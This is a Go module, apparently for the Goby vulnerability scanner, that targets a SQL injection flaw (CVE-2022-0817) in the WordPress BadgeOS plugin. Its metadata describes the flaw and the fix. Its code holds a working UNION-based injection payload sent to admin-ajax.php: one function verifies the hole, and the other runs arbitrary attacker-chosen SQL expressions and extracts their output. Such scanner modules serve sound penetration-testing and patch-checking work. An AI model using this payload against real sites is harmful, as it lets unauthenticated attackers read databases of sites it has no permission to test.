package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wordpress BadgeOS plugin SQL injection vulnerability (CVE-2022-0817)",
    "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers. WordPress plugin is an application plug-in.</p><p>There is a SQL injection vulnerability in WordPress plugin BadgeOS versions before 3.7.0. The vulnerability stems from the fact that certain parameters passed by the plugin through AJAX operations are not properly cleaned and escaped before being used to splice SQL statements. Unauthenticated users can use this vulnerability to implement SQL injection attacks.</p>",
    "Product": "wordpress-badgeOS",
    "Homepage": "https://wordpress.org/plugins/badgeos/",
    "DisclosureDate": "2022-12-26",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "body=\"/wp-content/plugins\" && body=\"badgeos\"",
    "GobyQuery": "body=\"/wp-content/plugins\" && body=\"badgeos\"",
    "Level": "3",
    "Impact": "<p>There is a SQL injection vulnerability in WordPress plugin BadgeOS versions before 3.7.0. The vulnerability stems from the fact that certain parameters passed by the plugin through AJAX operations are not properly cleaned and escaped before being used to splice SQL statements. Unauthenticated users can use this vulnerability to implement SQL injection attacks.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/badgeos/\">https://wordpress.org/plugins/badgeos/</a></p>",
    "References": [
        "https://wordpress.org/plugins/badgeos/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "user()",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2022-0817"
    ],
    "CNNVD": [
        "CNNVD-202205-2705"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "wordpress BadgeOS 插件 user_id 文件 SQL 注入漏洞（CVE-2022-0817）",
            "Product": "wordpress-badgeOS",
            "Description": "<p>WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。</p><p>WordPress plugin BadgeOS 3.7.0之前版本存在SQL注入漏洞，该漏洞源于插件在通过AJAX操作传递的某些参数在用于拼接SQL语句之前未经过正确清理和转义。未经身份验证的用户可以利用该漏洞实现SQL注入攻击。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://wordpress.org/plugins/badgeos/\" target=\"_blank\">https://wordpress.org/plugins/badgeos/</a><br></p>",
            "Impact": "<p>WordPress plugin BadgeOS 3.7.0之前版本存在SQL注入漏洞，该漏洞源于插件在通过AJAX操作传递的某些参数在用于拼接SQL语句之前未经过正确清理和转义。未经身份验证的用户可以利用该漏洞实现SQL注入攻击。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Wordpress BadgeOS plugin SQL injection vulnerability (CVE-2022-0817)",
            "Product": "wordpress-badgeOS",
            "Description": "<p>WordPress and WordPress plugin are products of the WordPress Foundation. WordPress is a blog platform developed using PHP language. The platform supports personal blog websites on PHP and MySQL servers. WordPress plugin is an application plug-in.</p><p>There is a SQL injection vulnerability in WordPress plugin BadgeOS versions before 3.7.0. The vulnerability stems from the fact that certain parameters passed by the plugin through AJAX operations are not properly cleaned and escaped before being used to splice SQL statements. Unauthenticated users can use this vulnerability to implement SQL injection attacks.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://wordpress.org/plugins/badgeos/\" target=\"_blank\">https://wordpress.org/plugins/badgeos/</a><br></p>",
            "Impact": "<p>There is a SQL injection vulnerability in WordPress plugin BadgeOS versions before 3.7.0. The vulnerability stems from the fact that certain parameters passed by the plugin through AJAX operations are not properly cleaned and escaped before being used to splice SQL statements. Unauthenticated users can use this vulnerability to implement SQL injection attacks.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10790"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			uri_1 := "/wp-admin/admin-ajax.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg_1.Data = "action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5(890),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
			if resp, err := httpclient.DoHttpRequest(hostinfo, cfg_1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "fff11dd7e8d9c510") && strings.Contains(resp.Utf8Html, "badgeos-arrange-buttons") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sql_str := ss.Params["sql"].(string)
			uri_1 := "/wp-admin/admin-ajax.php"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg_1.Data = fmt.Sprintf("action=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,%s,1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -", sql_str)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "badgeos-arrange-buttons") {
					r, err := regexp.Compile(`"type":\["(.*?)"\],`)
					if err!=nil{
						expResult.Success = false
					}
					result_list := r.FindStringSubmatch(resp.Utf8Html)
					if len(result_list)>=2{
						expResult.Success = true
						expResult.Output = result_list[1]
					}
				}
			}
			return expResult
		},
	))
}
